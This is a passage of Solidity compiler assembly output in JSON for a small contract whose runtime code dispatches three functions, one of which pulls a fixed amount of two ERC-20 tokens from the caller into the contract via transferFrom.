								{
									"begin": 483,
									"end": 493,
									"name": "SWAP1",
									"source": 4
								},
								{
									"begin": 483,
									"end": 493,
									"name": "SSTORE",
									"source": 4
								},
								{
									"begin": 254,
									"end": 2458,
									"name": "PUSH [tag]",
									"source": 4,
									"value": "8"
								},
								{
									"begin": 254,
									"end": 2458,
									"name": "JUMP",
									"source": 4
								},
								{
									"begin": 14,
									"end": 191,
									"name": "tag",
									"source": 5,
									"value": "7"
								},
								{
									"begin": 14,
									"end": 191,
									"name": "JUMPDEST",
									"source": 5
								},
								{
									"begin": 93,
									"end": 106,
									"name": "DUP1",
									"source": 5
								},
								{
									"begin": 93,
									"end": 106,
									"name": "MLOAD",
									"source": 5
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"source": -1,
									"value": "1"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"source": -1,
									"value": "1"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"source": -1,
									"value": "A0"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "SHL",
									"source": -1
								},
								{
									"begin": -1,
									"end": -1,
									"name": "SUB",
									"source": -1
								},
								{
									"begin": 135,
									"end": 166,
									"name": "DUP2",
									"source": 5
								},
								{
									"begin": 135,
									"end": 166,
									"name": "AND",
									"source": 5
								},
								{
									"begin": 125,
									"end": 167,
									"name": "DUP2",
									"source": 5
								},
								{
									"begin": 125,
									"end": 167,
									"name": "EQ",
									"source": 5
								},
								{
									"begin": 115,
									"end": 185,
									"name": "PUSH [tag]",
									"source": 5,
									"value": "10"
								},
								{
									"begin": 115,
									"end": 185,
									"name": "JUMPI",
									"source": 5
								},
								{
									"begin": 181,
									"end": 182,
									"name": "PUSH",
									"source": 5,
									"value": "0"
								},
								{
									"begin": 178,
									"end": 179,
									"name": "DUP1",
									"source": 5
								},
								{
									"begin": 171,
									"end": 183,
									"name": "REVERT",
									"source": 5
								},
								{
									"begin": 115,
									"end": 185,
									"name": "tag",
									"source": 5,
									"value": "10"
								},
								{
									"begin": 115,
									"end": 185,
									"name": "JUMPDEST",
									"source": 5
								},
								{
									"begin": 14,
									"end": 191,
									"name": "SWAP2",
									"source": 5
								},
								{
									"begin": 14,
									"end": 191,
									"name": "SWAP1",
									"source": 5
								},
								{
									"begin": 14,
									"end": 191,
									"name": "POP",
									"source": 5
								},
								{
									"begin": 14,
									"end": 191,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 5
								},
								{
									"begin": 196,
									"end": 574,
									"name": "tag",
									"source": 5,
									"value": "3"
								},
								{
									"begin": 196,
									"end": 574,
									"name": "JUMPDEST",
									"source": 5
								},
								{
									"begin": 284,
									"end": 290,
									"name": "PUSH",
									"source": 5,
									"value": "0"
								},
								{
									"begin": 292,
									"end": 298,
									"name": "DUP1",
									"source": 5
								},
								{
									"begin": 300,
									"end": 306,
									"name": "PUSH",
									"source": 5,
									"value": "0"
								},
								{
									"begin": 353,
									"end": 355,
									"name": "PUSH",
									"source": 5,
									"value": "60"
								},
								{
									"begin": 341,
									"end": 350,
									"name": "DUP5",
									"source": 5
								},
								{
									"begin": 332,
									"end": 339,
									"name": "DUP7",
									"source": 5
								},
								{
									"begin": 328,
									"end": 351,
									"name": "SUB",
									"source": 5
								},
								{
									"begin": 324,
									"end": 356,
									"name": "SLT",
									"source": 5
								},
								{
									"begin": 321,
									"end": 373,
									"name": "ISZERO",
									"source": 5
								},
								{
									"begin": 321,
									"end": 373,
									"name": "PUSH [tag]",
									"source": 5,
									"value": "12"
								},
								{
									"begin": 321,
									"end": 373,
									"name": "JUMPI",
									"source": 5
								},
								{
									"begin": 369,
									"end": 370,
									"name": "PUSH",
									"source": 5,
									"value": "0"
								},
								{
									"begin": 366,
									"end": 367,
									"name": "DUP1",
									"source": 5
								},
								{
									"begin": 359,
									"end": 371,
									"name": "REVERT",
									"source": 5
								},
								{
									"begin": 321,
									"end": 373,
									"name": "tag",
									"source": 5,
									"value": "12"
								},
								{
									"begin": 321,
									"end": 373,
									"name": "JUMPDEST",
									"source": 5
								},
								{
									"begin": 392,
									"end": 432,
									"name": "PUSH [tag]",
									"source": 5,
									"value": "13"
								},
								{
									"begin": 422,
									"end": 431,
									"name": "DUP5",
									"source": 5
								},
								{
									"begin": 392,
									"end": 432,
									"name": "PUSH [tag]",
									"source": 5,
									"value": "7"
								},
								{
									"begin": 392,
									"end": 432,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 5
								},
								{
									"begin": 392,
									"end": 432,
									"name": "tag",
									"source": 5,
									"value": "13"
								},
								{
									"begin": 392,
									"end": 432,
									"name": "JUMPDEST",
									"source": 5
								},
								{
									"begin": 382,
									"end": 432,
									"name": "SWAP3",
									"source": 5
								},
								{
									"begin": 382,
									"end": 432,
									"name": "POP",
									"source": 5
								},
								{
									"begin": 451,
									"end": 500,
									"name": "PUSH [tag]",
									"source": 5,
									"value": "14"
								},
								{
									"begin": 496,
									"end": 498,
									"name": "PUSH",
									"source": 5,
									"value": "20"
								},
								{
									"begin": 485,
									"end": 494,
									"name": "DUP6",
									"source": 5
								},
								{
									"begin": 481,
									"end": 499,
									"name": "ADD",
									"source": 5
								},
								{
									"begin": 451,
									"end": 500,
									"name": "PUSH [tag]",
									"source": 5,
									"value": "7"
								},
								{
									"begin": 451,
									"end": 500,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 5
								},
								{
									"begin": 451,
									"end": 500,
									"name": "tag",
									"source": 5,
									"value": "14"
								},
								{
									"begin": 451,
									"end": 500,
									"name": "JUMPDEST",
									"source": 5
								},
								{
									"begin": 441,
									"end": 500,
									"name": "SWAP2",
									"source": 5
								},
								{
									"begin": 441,
									"end": 500,
									"name": "POP",
									"source": 5
								},
								{
									"begin": 519,
									"end": 568,
									"name": "PUSH [tag]",
									"source": 5,
									"value": "15"
								},
								{
									"begin": 564,
									"end": 566,
									"name": "PUSH",
									"source": 5,
									"value": "40"
								},
								{
									"begin": 553,
									"end": 562,
									"name": "DUP6",
									"source": 5
								},
								{
									"begin": 549,
									"end": 567,
									"name": "ADD",
									"source": 5
								},
								{
									"begin": 519,
									"end": 568,
									"name": "PUSH [tag]",
									"source": 5,
									"value": "7"
								},
								{
									"begin": 519,
									"end": 568,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 5
								},
								{
									"begin": 519,
									"end": 568,
									"name": "tag",
									"source": 5,
									"value": "15"
								},
								{
									"begin": 519,
									"end": 568,
									"name": "JUMPDEST",
									"source": 5
								},
								{
									"begin": 509,
									"end": 568,
									"name": "SWAP1",
									"source": 5
								},
								{
									"begin": 509,
									"end": 568,
									"name": "POP",
									"source": 5
								},
								{
									"begin": 196,
									"end": 574,
									"name": "SWAP3",
									"source": 5
								},
								{
									"begin": 196,
									"end": 574,
									"name": "POP",
									"source": 5
								},
								{
									"begin": 196,
									"end": 574,
									"name": "SWAP3",
									"source": 5
								},
								{
									"begin": 196,
									"end": 574,
									"name": "POP",
									"source": 5
								},
								{
									"begin": 196,
									"end": 574,
									"name": "SWAP3",
									"source": 5
								},
								{
									"begin": 196,
									"end": 574,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 5
								},
								{
									"begin": 196,
									"end": 574,
									"name": "tag",
									"source": 5,
									"value": "8"
								},
								{
									"begin": 196,
									"end": 574,
									"name": "JUMPDEST",
									"source": 5
								},
								{
									"begin": 254,
									"end": 2458,
									"name": "PUSH #[$]",
									"source": 4,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 254,
									"end": 2458,
									"name": "DUP1",
									"source": 4
								},
								{
									"begin": 254,
									"end": 2458,
									"name": "PUSH [$]",
									"source": 4,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 254,
									"end": 2458,
									"name": "PUSH",
									"source": 4,
									"value": "0"
								},
								{
									"begin": 254,
									"end": 2458,
									"name": "CODECOPY",
									"source": 4
								},
								{
									"begin": 254,
									"end": 2458,
									"name": "PUSH",
									"source": 4,
									"value": "0"
								},
								{
									"begin": 254,
									"end": 2458,
									"name": "RETURN",
									"source": 4
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220c015545002b616c960000340f211e4b96c1eed86be79a67aef673e97ba5f4b7064736f6c63430008120033",
									".code": [
										{
											"begin": 254,
											"end": 2458,
											"name": "PUSH",
											"source": 4,
											"value": "80"
										},
										{
											"begin": 254,
											"end": 2458,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 254,
											"end": 2458,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 254,
											"end": 2458,
											"name": "CALLVALUE",
											"source": 4
										},
										{
											"begin": 254,
											"end": 2458,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 254,
											"end": 2458,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 254,
											"end": 2458,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "1"
										},
										{
											"begin": 254,
											"end": 2458,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 254,
											"end": 2458,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 254,
											"end": 2458,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 254,
											"end": 2458,
											"name": "REVERT",
											"source": 4
										},
										{
											"begin": 254,
											"end": 2458,
											"name": "tag",
											"source": 4,
											"value": "1"
										},
										{
											"begin": 254,
											"end": 2458,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 254,
											"end": 2458,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 254,
											"end": 2458,
											"name": "PUSH",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 254,
											"end": 2458,
											"name": "CALLDATASIZE",
											"source": 4
										},
										{
											"begin": 254,
											"end": 2458,
											"name": "LT",
											"source": 4
										},
										{
											"begin": 254,
											"end": 2458,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "2"
										},
										{
											"begin": 254,
											"end": 2458,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 254,
											"end": 2458,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 254,
											"end": 2458,
											"name": "CALLDATALOAD",
											"source": 4
										},
										{
											"begin": 254,
											"end": 2458,
											"name": "PUSH",
											"source": 4,
											"value": "E0"
										},
										{
											"begin": 254,
											"end": 2458,
											"name": "SHR",
											"source": 4
										},
										{
											"begin": 254,
											"end": 2458,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 254,
											"end": 2458,
											"name": "PUSH",
											"source": 4,
											"value": "2216E590"
										},
										{
											"begin": 254,
											"end": 2458,
											"name": "EQ",
											"source": 4
										},
										{
											"begin": 254,
											"end": 2458,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "3"
										},
										{
											"begin": 254,
											"end": 2458,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 254,
											"end": 2458,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 254,
											"end": 2458,
											"name": "PUSH",
											"source": 4,
											"value": "3E50269C"
										},
										{
											"begin": 254,
											"end": 2458,
											"name": "EQ",
											"source": 4
										},
										{
											"begin": 254,
											"end": 2458,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 254,
											"end": 2458,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 254,
											"end": 2458,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 254,
											"end": 2458,
											"name": "PUSH",
											"source": 4,
											"value": "D7DF8D6F"
										},
										{
											"begin": 254,
											"end": 2458,
											"name": "EQ",
											"source": 4
										},
										{
											"begin": 254,
											"end": 2458,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "5"
										},
										{
											"begin": 254,
											"end": 2458,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 254,
											"end": 2458,
											"name": "tag",
											"source": 4,
											"value": "2"
										},
										{
											"begin": 254,
											"end": 2458,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 254,
											"end": 2458,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 254,
											"end": 2458,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 254,
											"end": 2458,
											"name": "REVERT",
											"source": 4
										},
										{
											"begin": 506,
											"end": 581,
											"name": "tag",
											"source": 4,
											"value": "3"
										},
										{
											"begin": 506,
											"end": 581,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 506,
											"end": 581,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "6"
										},
										{
											"begin": 506,
											"end": 581,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "7"
										},
										{
											"begin": 506,
											"end": 581,
											"name": "CALLDATASIZE",
											"source": 4
										},
										{
											"begin": 506,
											"end": 581,
											"name": "PUSH",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 506,
											"end": 581,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "8"
										},
										{
											"begin": 506,
											"end": 581,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 4
										},
										{
											"begin": 506,
											"end": 581,
											"name": "tag",
											"source": 4,
											"value": "7"
										},
										{
											"begin": 506,
											"end": 581,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 558,
											"end": 564,
											"name": "PUSH",
											"source": 4,
											"value": "2"
										},
										{
											"begin": 558,
											"end": 574,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 558,
											"end": 574,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "NOT",
											"source": -1
										},
										{
											"begin": 558,
											"end": 574,
											"name": "AND",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 558,
											"end": 574,
											"name": "SWAP3",
											"source": 4
										},
										{
											"begin": 558,
											"end": 574,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 558,
											"end": 574,
											"name": "SWAP3",
											"source": 4
										},
										{
											"begin": 558,
											"end": 574,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 558,
											"end": 574,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 558,
											"end": 574,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 558,
											"end": 574,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 558,
											"end": 574,
											"name": "OR",
											"source": 4
										},
										{
											"begin": 558,
											"end": 574,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 558,
											"end": 574,
											"name": "SSTORE",
											"source": 4
										},
										{
											"begin": 506,
											"end": 581,
											"name": "JUMP",
											"source": 4
										},
										{
											"begin": 506,
											"end": 581,
											"name": "tag",
											"source": 4,
											"value": "6"
										},
										{
											"begin": 506,
											"end": 581,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 506,
											"end": 581,
											"name": "STOP",
											"source": 4
										},
										{
											"begin": 1327,
											"end": 2454,
											"name": "tag",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 1327,
											"end": 2454,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 1327,
											"end": 2454,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "6"
										},
										{
											"begin": 1327,
											"end": 2454,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "11"
										},
										{
											"begin": 1327,
											"end": 2454,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 4
										},
										{
											"begin": 587,
											"end": 1319,
											"name": "tag",
											"source": 4,
											"value": "5"
										},
										{
											"begin": 587,
											"end": 1319,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 587,
											"end": 1319,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "6"
										},
										{
											"begin": 587,
											"end": 1319,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "13"
										},
										{
											"begin": 587,
											"end": 1319,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 4
										},
										{
											"begin": 1327,
											"end": 2454,
											"name": "tag",
											"source": 4,
											"value": "11"
										},
										{
											"begin": 1327,
											"end": 2454,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 1375,
											"end": 1381,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1375,
											"end": 1381,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "23B872DD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 1375,
											"end": 1381,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1375,
											"end": 1381,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 1375,
											"end": 1381,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1375,
											"end": 1381,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1368,
											"end": 1395,
											"name": "PUSH",
											"source": 4,
											"value": "23B872DD"
										},
										{
											"begin": 1368,
											"end": 1395,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "16"
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1396,
											"end": 1406,
											"name": "CALLER",
											"source": 4
										},
										{
											"begin": 1396,
											"end": 1406,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1416,
											"end": 1420,
											"name": "ADDRESS",
											"source": 4
										},
										{
											"begin": 1416,
											"end": 1420,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1423,
											"end": 1425,
											"name": "PUSH",
											"source": 4,
											"value": "A"
										},
										{
											"begin": 1423,
											"end": 1425,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "PUSH",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "17"
										},
										{
											"begin": 1368,
											"end": 1426,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 4
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "tag",
											"source": 4,
											"value": "16"
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "PUSH",
											"source": 4,
											"value": "20"
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "DUP4",
											"source": 4
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "SUB",
											"source": 4
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "DUP8",
											"source": 4
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "GAS",
											"source": 4
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "CALL",
											"source": 4
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "19"
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "RETURNDATACOPY",
											"source": 4
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "REVERT",
											"source": 4
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "tag",
											"source": 4,
											"value": "19"
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "PUSH",
											"source": 4,
											"value": "1F"
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "NOT",
											"source": 4
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "PUSH",
											"source": 4,
											"value": "1F"
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "20"
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "21"
										},
										{
											"begin": 1368,
											"end": 1426,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 4
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "tag",
											"source": 4,
											"value": "20"
										},
										{
											"begin": 1368,
											"end": 1426,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 1443,
											"end": 1449,
											"name": "PUSH",
											"source": 4,
											"value": "1"
										},
										{
											"begin": 1443,
											"end": 1449,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "23B872DD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 1443,
											"end": 1449,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1443,
											"end": 1449,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 1443,
											"end": 1449,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1443,
											"end": 1449,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1436,
											"end": 1463,
											"name": "PUSH",
											"source": 4,
											"value": "23B872DD"
										},
										{
											"begin": 1436,
											"end": 1463,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "22"
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1464,
											"end": 1474,
											"name": "CALLER",
											"source": 4
										},
										{
											"begin": 1464,
											"end": 1474,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1484,
											"end": 1488,
											"name": "ADDRESS",
											"source": 4
										},
										{
											"begin": 1484,
											"end": 1488,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1491,
											"end": 1493,
											"name": "PUSH",
											"source": 4,
											"value": "A"
										},
										{
											"begin": 1491,
											"end": 1493,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "PUSH",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "17"
										},
										{
											"begin": 1436,
											"end": 1494,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 4
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "tag",
											"source": 4,
											"value": "22"
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "PUSH",
											"source": 4,
											"value": "20"
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "DUP4",
											"source": 4
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "SUB",
											"source": 4
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "DUP8",
											"source": 4
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "GAS",
											"source": 4
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "CALL",
											"source": 4
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 1436,
											"end": 1494,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "24"
										},
										{
											"begin": 1436,
